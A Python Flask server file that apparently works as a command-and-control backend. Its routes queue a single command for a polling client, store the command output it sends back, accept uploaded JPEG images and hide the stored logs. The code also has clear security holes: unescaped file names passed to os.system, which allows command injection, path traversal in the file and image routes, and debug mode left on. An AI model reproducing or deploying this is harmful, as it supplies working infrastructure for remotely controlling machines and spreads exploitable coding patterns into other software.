import os
from flask import Flask, request, redirect, make_response, jsonify, Response, render_template

app = Flask(__name__, template_folder="static/")
command = "null"


def createFile(log):
    f = open(f"files/{log.get('date')}.txt", "w", encoding="utf-8")
    f.write(f"#{log.get('caption')}\n{log.get('body')}")
    f.close()


@app.route("/clear", methods=["GET"])
def hideLogs():
    for file in os.listdir("files/"):
        os.system(f"mv files/{file} files/{file}.hide")
    
    response = {
        "message": "Logs cleared",      
        "request-status": "OK"
    }

    return jsonify(response)


@app.route("/sendlogs", methods=["POST"])
def reviceLogs():
    data = request.form
    logDict = {
        "caption": f"cmd:{data.get('command')}",
        "date": data.get("date"),
        "body": data.get("body")
    }

    createFile(logDict)

    response = {
        "request-status": "OK"
    }
    

    return jsonify(response)


@app.route("/files/<filename>", methods=["GET"])
def readFile(filename):
    try:
        with open(f"files/{filename}", 'r') as file:
            content = file.read()
            return Response(content, mimetype='text/plain')
    except Exception as e:
        response = {
            "error-message": f"{e}",
            "request-status": "BAD"
        }
        return jsonify(response)


@app.route('/upload', methods=['POST'])
def save_uploaded_image():
    if 'file' not in request.files:
        return 'No file uploaded.'
    
    file = request.files['file']
    if file.filename == '':
        return 'No file selected.'

    if file and allowed_file(file.filename):
        file.save('tmp.jpeg')
        return 'File saved as tmp.jpeg.'
    else:
        return 'Invalid file format.'


def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() == 'jpeg'


@app.route("/img/<imageFile>", methods=["GET"])
def renderImage(imageFile):
    print("test")
    try:
        with open(f"{imageFile}", "rb") as file:
            content = file.read()
            return Response(content, mimetype='image/jpeg')
    except FileNotFoundError as e:
        return f"{e}"


@app.route("/listen", methods=["GET", "POST"])
def cmdListen():
    global command
    if request.method == "GET":
        data = {
            "command": command
        }
        command = "null"
        return data
    else:
        data = request.form
        command = data.get('command')
        print(f"Recived: {command}")

        status = {
            "request-status": "OK",
            "data-recived": command
        }

        return jsonify(status)


@app.route("/", methods=["GET"])
def showLogs():
    try:
        logs = []
        for log in os.listdir("files/"):
            if log.split(".")[-1] == "hide":
                continue
            else:
                link = log
                with open(f"files/{log}", "r", encoding="utf-8") as file:
                    caption = [i.split("\n")[0].split("# ")[-1] for i in file.readlines() if i[0] == "#"]
                log = {"link": link, "caption": caption[0]}
                logs.append(log)
        print(logs)
        return render_template("index.html", files=logs)
    except IndexError as e:
        return f"some erorr maaan fuck dat shit\n{e}"


def main(a=1, b=1):
    return app.run(threaded=True, port=5000, debug=True)


if __name__ == '__main__':
    main()